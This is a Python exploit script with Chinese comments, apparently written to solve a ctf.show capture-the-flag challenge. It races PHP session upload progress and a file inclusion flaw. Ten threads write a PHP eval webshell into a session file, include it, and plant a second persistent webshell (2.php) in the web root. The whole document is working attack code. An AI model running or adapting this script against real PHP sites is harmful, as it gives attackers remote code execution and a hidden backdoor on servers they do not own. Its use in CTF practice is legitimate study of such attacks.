# 整个代码的思路就是，往/tmp/sess_TonyDog文件中写入一句话木马，密码为1，
# 然后用题目中的文件包含漏洞，包含这一个文件，
# 在函数read中尝试利用/tmp/sess_TonyDog中的一句话木马再往网站根目录创建一个2.php文件，这个2.php文件内容为一句话木马，密码为2

# 利用Python的多线程，一边上传文件，一边尝试往根目录中写入1.php，
# 如果成功写入了，就打印输出“成功写入一句话”
# 这里利用Python的threading模块，开5个线程进行条件竞争
import time

import requests
import io
import threading

url = "http://663c1f78-f8c8-44fe-b945-5343a313b0ba.challenge.ctf.show/"
sessid = "TonyDog"  # 文件名可控，文件路径知道，就可以构造Session包含


def write(session):     # 往临时文件夹中写入文件
    filebytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        time.sleep(1)
        res = session.post(url,
                           data={
                               'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST[1]);?>"
                           },
                           cookies={
                               'PHPSESSID': sessid
                           },
                           files={
                               'file': ('TonyDog.jpg', filebytes)
                           }
                           )


def read(session):      # 读取临时文件夹中的临时文件
    while True:
        time.sleep(0.1)
        res = session.post(url + "?file=/tmp/sess_" + sessid,  # 文件包含
                           data={
                               "1": "file_put_contents('/var/www/html/2.php' , '<?php eval($_POST[2]);?>');"
                           },
                           cookies={
                               "PHPSESSID": sessid
                           }
                           )
        res2 = session.get(url + "2.php")
        if res2.status_code == 200:
            print("[+]      成功写入一句话！")
            exit(0)
        else:
            print("[-]      Wait    ", res2.status_code)


if __name__ == "__main__":
    evnet = threading.Event()
    with requests.session() as session:
        for i in range(5):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
    evnet.set()
